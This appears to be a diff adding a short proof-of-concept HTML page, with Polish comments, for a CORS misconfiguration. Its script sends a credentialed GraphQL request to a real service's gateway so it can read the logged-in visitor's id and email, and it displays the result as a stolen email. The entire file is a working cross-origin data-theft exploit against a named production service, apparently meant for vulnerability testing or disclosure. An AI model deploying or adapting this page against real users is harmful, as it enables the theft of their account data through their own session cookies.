@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS PoC Segment</title>
+</head>
+<body>
+    <h1>CORS Vulnerability Test</h1>
+    <p>Jeśli zobaczysz swój email poniżej, podatność jest potwierdzona:</p>
+    <div id="result" style="color: red; font-weight: bold;">Czekam na dane...</div>
+
+    <script>
+        const graphqlQuery = JSON.stringify({
+            query: "query { me { id email } }"
+        });
+
+        fetch("https://app.segment.com/gateway-api/graphql", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: graphqlQuery,
+            credentials: "include" // TO JEST KLUCZOWE: wysyła Twoje ciastka sesyjne
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.data && data.data.me) {
+                document.getElementById("result").innerText = "SUKCES! Skradziony email: " + data.data.me.email;
+                console.log("Pełne dane:", data);
+            } else {
+                document.getElementById("result").innerText = "Błąd: Brak danych w odpowiedzi. Sprawdź konsolę.";
+            }
+        })
+        .catch(err => {
+            document.getElementById("result").innerText = "Błąd CORS: Przeglądarka zablokowała odczyt (to znaczy, że system jest bezpieczny).";
+            console.error(err);
+        });
+    </script>
+</body>
+</html>
